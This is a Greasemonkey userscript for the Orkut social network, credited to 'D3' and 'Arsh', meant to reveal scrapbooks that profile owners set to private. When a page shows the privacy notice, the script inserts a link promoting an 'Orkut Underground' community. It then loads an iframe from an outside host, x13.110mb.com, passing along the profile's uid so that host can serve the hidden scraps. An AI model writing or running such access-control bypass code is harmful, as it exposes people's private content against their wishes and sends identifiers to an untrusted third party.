// ==UserScript==
// @author            D3 and edited by Arsh
//@Credits        Rodrigo Lacerda [http://www.orkut.com/Profile.aspx?uid=1707700121110059969] 
// @name           View Locked Scrapbook
// @namespace      http://www.ougarena.com
// @description    View Locked Scrapbook
// @include        http://www.orkut.com/*
// ==/UserScript==

/* Credits to Rodrigo Lacerda [http://www.orkut.com/Profile.aspx?uid=1707700121110059969]  for making that site.. and last part of this script */
if((document.getElementsByTagName('div').item(10).innerHTML.indexOf('This content has been set to private by the profile owner.')>=0) || (document.getElementsByTagName('div').item(10).innerHTML.indexOf('Este conteúdo foi definido como particular pelo dono do perfil.')>=0))
{
document.body.innerHTML+="<br><h1>For more Join <a href='http:\/\/www.orkut.com\/Community.aspx?cmm=34705978&amp;D3=google.com'>Orkut Underground - OUG 12</a></h1><br>"+"<iframe width='800' height='600'></iframe>"
window[0].location='http://x13.110mb.com/scraps.php?'+location.href.match(/uid=\d*/gi);
}




